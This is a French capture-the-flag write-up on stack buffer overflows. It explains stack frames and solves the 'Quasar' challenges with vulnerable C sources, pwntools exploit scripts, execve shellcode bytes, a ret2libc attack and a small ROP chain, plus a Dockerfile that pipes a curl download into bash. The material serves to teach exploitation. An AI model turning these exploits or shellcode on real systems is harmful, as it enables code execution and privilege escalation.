# Les failles buffer overflow

Chaque processus qui s’exécute sur un système d’exploitation possède 
un espace mémoire  virtuel. La mémoire physique est en effet partagée 
par tout le système et l’espace mémoire virtuelle est dédié à un 
processus. Cet espace mémoire contient :

- le binaire du programme

- les librairies

- la heap (pour les variables alloue de façon dynamique)

- la stack ou pile (pour les variables locales des fonctions)

- différents espaces mémoire allouer par le programme

- etc

Le problème c’est que les programmes stockent au même endroit des  données pouvant être contrôlées par l’utilisateur et des données qui contrôlent le cours d'exécution du programme. 

## <img title="" src="file:///C:/labo/assets/2022-02-27-15-39-07-image.png" alt="" width="854">

### La stack

La stack est une structure de données utilisée par les fonctions pour
 stocker et utiliser des variables locales. Le processeur utilise 2 
instructions pour placer et retirer des données de la stack, `PUSH` pour pousser des données, et `POP` pour retirer. La stack fonctionne sur le principe de `LIFO` (last in, first out).

![](C:\labo\assets\2022-02-27-16-56-41-image.png)

Le registre ESP du processeur pointera sur le début de la stack. 

Le registre EBP pointera sur la base de la stack frame.

Chaque fonction qui est appelée va se réserver un espace sur la stack 
que l’on nomme une `stack frame`. juste avant que la nouvelle stack frame soit creer le programme va pousser sur la stack une sauvegarde de ebp et du registre `eip` qui contient l'adresse de l'instruction suivant l'appel de la fonction.

Pour que le programme puisse retourner à l’instruction suivant 
l’appel de la fonction, l’adresse de l’instruction suivante sera aussi 
placée sur la stack. Aussi a chaque instructions exécuter par le 
processeurs le registre **eip** (return pointer) contiendra l’adresse de la prochaine instruction.

## Le buffer overflow

Une faille buffer overflow se produit lorsqu’un programme tente 
d’écrire un nombre de données qui dépasse les limites d’un buffer. Les 
valeurs des variables ainsi que les adresses placer sur la stack frame 
seront écrasés par les données qui déborde du buffer.

L’exploitation d’un dépassement de tampon nous permet  de 
contrôler ou de faire crasher un processus ou de modifier ses variables 
internes.

Les données originales de la stack frame comprennent le return 
pointer (l’adresse de retour)  de la fonction exploitée, c’est-à-dire 
l’adresse à laquelle le programme doit se rendre ensuite. Cependant, 
on peut définir de nouvelles valeurs en écrasant les données de
 la stack, pour ainsi pointer vers une adresse de son choix. On
 définit généralement les nouvelles valeurs à une adresse où se trouve 
le code malveillant. Ce changement modifie le cours 
de l’exécution du programme et transfère le contrôle au code malveillant.

![](C:\labo\assets\2022-02-27-17-31-48-image.png)

## Quasar 0

Nous pouvons observer au niveau du code source l'initialisation d'une variable `target` et d'un bufferk. La fonction `strcpy` copiera les données en entrer sans vérification de la taille. Si la variable target est différent de 0 le programme exécutera un shell pour nous.

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
// gcc -m32 quasar0.c -o quasar0

char *const param[] = {"/bin/bash", "-p", NULL};

int main(int argc, char **argv) {
        int target = 0;
        char buffer[32];

        if (argc != 2) {
                printf("[-] Usage is %s [STRING]\n", argv[0]);
                return -1;
        }

        strcpy(buffer, argv[1]);

        if (target != 0) {
                printf("[+] g00d b0y !\n");
                execve("/bin/bash", param, NULL);
        } else {
                printf("[-] BAZINGA ! Try again !\n");
        }
        return 0;
}
```

Ce programme peut-être exploite avec :

```bash
./quasar0 $(python3 -c 'print("T" * 33)')
```

Le buffer accepte 32 caractères, si nous envoyons plus de caractere la variable target qui se trouve aussi sur la stack est modifiée.

## Quasar1

Très similaire à quasar0, la différence est que la variable target doit être égal a 0xd34db4b3.

Solution:

```bash
./quasar1 $(echo -en "TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT\xb3\xb4\x4d\xd3")
```

## Quasar2

Le programme nécessite ici d'appeler la fonction `callMeMaybe`, pour cela il faut trouver l'adresse de la fonction.

Avec radare2 : 

```bash
root@83e35c32f333:/pwning/quasar2# r2 ./quasar2
 -- Ceci n'est pas une r2pipe
[0x08049070]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x08049070]> afl
0x08049070    1 50           entry0
0x080490a3    1 4            fcn.080490a3
0x08049050    1 6            sym.imp.__libc_start_main
0x080490d0    4 49   -> 40   sym.deregister_tm_clones
0x08049110    4 57   -> 53   sym.register_tm_clones
0x08049150    3 33   -> 30   sym.__do_global_dtors_aux
0x08049180    1 2            entry.init0
0x08049290    1 1            sym.__libc_csu_fini
0x080490c0    1 4            sym.__x86.get_pc_thunk.bx
0x08049294    1 20           sym._fini
0x08049182    1 69           sym.callMeMaybe
0x08049040    1 6            sym.imp.puts
0x08049060    1 6            sym.imp.execve
0x08049230    4 85           sym.__libc_csu_init
0x080490b0    1 1            sym._dl_relocate_static_pie
0x080491c7    3 101          main
0x08049030    1 6            sym.imp.gets
0x08049000    3 32           sym._init
```

L'exploit : 

```python
from pwn import *

p = process("./quasar2")

flow = b"T" * 128
flow += p32(0x08049182)

p.sendline(flow)

p.interactive()
```

## Quasar3

Pour ce challenge après avoir trouvé le buffer overflow, il est nécessaire de placer un shellcode sur la stack.

```bash
In [1]: from pwn import *

In [2]: p = process("./quasar3")
[x] Starting local process './quasar3'
[+] Starting local process './quasar3': pid 2424

In [3]: buff = cyclic(200)

In [4]: p.sendline(buff)

In [5]: cyclic_find("kaab")
Out[5]: 140
```

```bash
Program received signal SIGSEGV, Segmentation fault.
0x6261616b in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffe428a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616169 ("iaab"?)
$ecx   : 0xf7f4c5c0  →  0xfbad2088
$edx   : 0xf7f4d89c  →  0x00000000
$esp   : 0xffe42930  →  "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
$ebp   : 0x6261616a ("jaab"?)
$esi   : 0xf7f4c000  →  0x001d9d6c
$edi   : 0xf7f4c000  →  0x001d9d6c
$eip   : 0x6261616b ("kaab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffe42930│+0x0000: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"    ← $esp
0xffe42934│+0x0004: "maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabya[...]"
0xffe42938│+0x0008: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffe4293c│+0x000c: "oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffe42940│+0x0010: "paabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffe42944│+0x0014: "qaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffe42948│+0x0018: "raabsaabtaabuaabvaabwaabxaabyaab"
0xffe4294c│+0x001c: "saabtaabuaabvaabwaabxaabyaab"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6261616b
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "quasar3", stopped 0x6261616b in ?? (), reason: SIGSEGV
```

Il faut 140 caractères pour atteindre `eip`.

L'emplacement du buffer sur la stack nous est leak par le programme. Nous utiliserons cette adresse pour faire notre programme sauter vers le shellcode qui sera sur notre stack. Les instructions `0x90` nop sled nous aident à  arriver plus facilement sur le shellcode sans avoir à calculer avec précision son emplacement.

```python
from pwn import *

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode2 = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

p = process("./quasar3")

raw_input("attach gdb")

p.recvuntil(b"0x")
leak = int(p.recv(8), 16)
log.info(f"leak={hex(leak)}")


flow = b"T" * 77
flow += b"\x90" * 30
flow += shellcode2
flow += p32(leak+80)

p.sendline(flow)

p.interactive()
```



## Quasar 4

Commençons par se mettre a l'aise pour résoudre ce challenge. Cette vidéo montre comment setup un environnement pour les challenges sur la corruption de mémoire.

Avec docker nous pouvons invoquer un container avec les outils préinstallés. Voici mon `Dockerfile`:

```dockerfile
#### Commandes :
# docker build -t ctf:debian4.19 .
# docker run --rm -v $PWD:/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name ctf -i ctf:debian4.19
# docker exec -it ctf /bin/bash

FROM debian:10

RUN dpkg --add-architecture i386 && \
apt-get update && \
apt-get install -y build-essential jq strace ltrace curl wget rubygems gcc dnsutils netcat gcc-multilib \
net-tools vim gdb gdb-multiarch python python3 python3-pip python3-dev libssl-dev libffi-dev wget git make \
procps libpcre3-dev libdb-dev libxt-dev libxaw7-dev python-pip libc6:i386 libncurses5:i386 libstdc++6:i386 && \
pip install capstone requests pwntools r2pipe && \
pip3 install pwntools keystone-engine unicorn capstone ropper && \
mkdir tools && cd tools && \
git clone https://github.com/JonathanSalwan/ROPgadget && \
git clone https://github.com/radare/radare2 && cd radare2 && sys/install.sh

RUN bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
```

Pour que notre binaire s'exécute sans souci et aussi pour que les offsets de la libc restent les mêmes que sur la machine Quasar. Il faut récupérer et remplacer le fichier libc.so.6 dans notre container par celui de Quasar.

Avec `ldd` nous pouvons voir à quelle libc notre binaire est liée et son emplacement.

![](C:\labo\assets\2022-02-27-18-00-00-image.png)

Analysons le code source du binaire :

```c
#include <stdio.h>
#include <string.h>

// gcc -m32 quasar4.c -o quasar4

int main(int argc, char **argv) {
        int id = 0;
        char buffer[1024];

        memset(buffer, 0, strlen(buffer));

        printf("printf() address is : %p\n", (void*) printf);    // leak de la fonction printf
        printf("enter an array id : ");

        scanf("%d", &id);    // id est 2 instructions plus bas utiliser comme index pour notre buffer 
        printf("enter a string : ");

        scanf("%s", &buffer[id]); // pas de verification de la taille de l'entree nous avons notre buffer overflow
        printf("buffer[%d] => %s", id, &buffer[id]);
        return 0;
}
```

Checkons quelles sont les sécurités appliquées sur notre binaire:

`checksec ./quasar4`

![](C:\labo\assets\2022-02-27-18-13-56-image.png)

Nous pouvons voir NX et PIE sont actives.

NX : Nous ne pourrons pas exécuter un shellcode sur la stack. La stack est rendu non exécutable.

Il faudra donc utiliser des bouts de code assembleur que l'on nomme gadget que l'on retrouve dans notre binaire ou dans notre libc pour que le programme fasse ce qu'on lui dit.

PIE: l'ASLR est active. Cela implique que nous devrons trouver les adresses de nos gadgets quand le programme est en cours d'exécution.

Mais il faut d'abord rediriger le cours d'exécution du programme vers nos gadgets. Déclenchons le buffer overflow.

```python
#!/usr/bin/env python3

from pwn import *

p = process('./quasar4')

raw_input("attach gdb")    # nous laisse le temps d'attacher un debugger au programme

flow = cyclic(100)    # genere un pattern avec une longueur de 100 char

p.sendline(b"1040")    # met id a 1040

p.sendline(flow)    # on envoie en entree notre pattern de 100 char au programme

p.interactive()
```

![](C:\labo\assets\2022-02-27-19-08-39-image.png)

![](C:\labo\assets\2022-02-27-19-11-39-image.png)

Notre programme a crashé et nous pouvons voir que le registre `eip` contient `eaaa`

nous contrôlons donc le cours d'exécution du programme.

Pour trouver combien de caractère il nous faut pour écraser eip j'utilise `cyclic_find`:

![](C:\labo\assets\2022-02-27-19-15-13-image.png)

Maintenant que nous contrôlons eip ou allons à quelle adresse allons nous faire notre programme sauter. La libc contient des fonctions qui nous aident lorsque nous écrivons nos programmes. Par exemple lorsque notre programme fait appel a printf, il va se rendre dans la libc pour exécuter la fonction printf. On peut trouver dans la libc des fonctions comme `system` et `execve,` qui nous serons utiles pour prendre le contrôle de la machine.

Nous pouvons trouver l'offset de ces fonctions avec `readelf -s ./libc.so.6 | grep "system"` :

![](C:\labo\assets\2022-02-27-19-41-13-image.png)

Grâce au leak de la fonction printf présent dans le programme nous pourrons calculer et trouver la vraie adresse des fonctions dans notre libc et de nos gadgets.

```python
p.recvuntil(b"0x")
leak = int(p.recv(8), 16)
log.info(f"leak={hex(leak)}")
```

Le calcul consiste à soustraire le leak de l'offset de la fonction `printf` dans `libc` ce qui nous donnera l'adresse de la base de la `libc`.

 `readelf -s ./libc.so.6 | grep "printf"`

Maintenant il nous suffira d'ajouter à chaque offset de fonction ou de gadget l'adresse de la base de la libc.

```python
printf_offset = 0x52860
base_address_libc = leak - printf_offset

system_offset = 0x3e9e0
system_address = base_address_libc + system_offset
```

Vérifions si notre libc contient la chaine de caractère `"/bin/sh"` afin de faire notre programme executer `system("bin/sh")`.

`strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"`

![](C:\labo\assets\2022-02-27-19-54-45-image.png)

Il suffit maintenant de placer l'adresse de notre fonction system suivie de celle de notre chaine de caractère `/bin/sh`:

```python
binsh_offset = 0x17eaaa
binsh_addr = base_address_libc + binsh_offset

p.sendline("1040")

flow = b"T" * 16
flow2 = b"T" * 4

#nope = b"\x90" * 4

summon = [
        flow,
        p32(system_address),
        flow2,
        p32(binsh_addr),

]

summon = b"".join(summon)

p.sendline(summon)

p.interactive()
```

Et BOUM! nous avons invoqué un shell à partir du binaire ...... mais sans les droits du user de quasar5 :sweat_smile:

Voici une autre version de l'exploit permettant d'exécuter d'autres fonctions avec une mini rop chain, ici la fonction execve :

```python
#!/usr/bin/env python3

from pwn import *

p = process("./quasar4")
#gdb.attach(p)

elf = ELF('./quasar4')

#p = gdb.debug("./vuln")
raw_input("attach gdb")
p.recvuntil(b"0x")
leak = int(p.recv(8), 16)
log.info(f"leak={hex(leak)}")

printf_offset = 0x52860
base_address_libc = leak - printf_offset

system_offset = 0x3e9e0
system_address = base_address_libc + system_offset

binsh_offset = 0x17eaaa
binsh_addr = base_address_libc + binsh_offset
log.info(f"binsh_addr={hex(binsh_addr)}")

execve_offset = 0xc0470
execve_addr = base_address_libc + execve_offset

#pop_ebx = 0x101e
pop_ebx = base_address_libc + 0x0001a8b5
#pop_edx = base_address_libc + 0x02ee7c
pop_ecx_edx = base_address_libc + 0x2ee7b
xor_eax = base_address_libc + 0x2fe1f
inc_eax = base_address_libc + 0x00137725
ret_gad = base_address_libc + 0x099b2
int_0x80 = base_address_libc + 0x2f275
add_eax_0xb = base_address_libc + 0x0015b0c6

p.sendline(b"1040")

flow = b"T" * 16
flow2 = b"T" * 4

summon = [
    flow,
    p32(pop_ebx),
    p32(binsh_addr),
    p32(pop_ecx_edx),
    p32(0x0),
    p32(0x0),
    p32(xor_eax),
    p32(add_eax_0xb),
    p32(int_0x80),
]

summon = b"".join(summon)

p.sendline(summon)

p.interactive()
```

# Command list

```bash
ldd ./quasar4    # check libc version and location
```

### Gef

```bash
gdb -q -p `pidof quasar4`
```

```c
(gdb) vm    // show mapping of virtual memory
(gdb) p system    // print the location of system
(gdb) 
```

### Search symbols

```bash
readelf -s ./libc.so.6 | grep "printf"
objdump -d ./a.out | grep "<strcpy@plt>:"
```

### Search strings

```bash
strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
```

### ROP

```bash
ROPgadget --binary quasar4 | grep ""
```
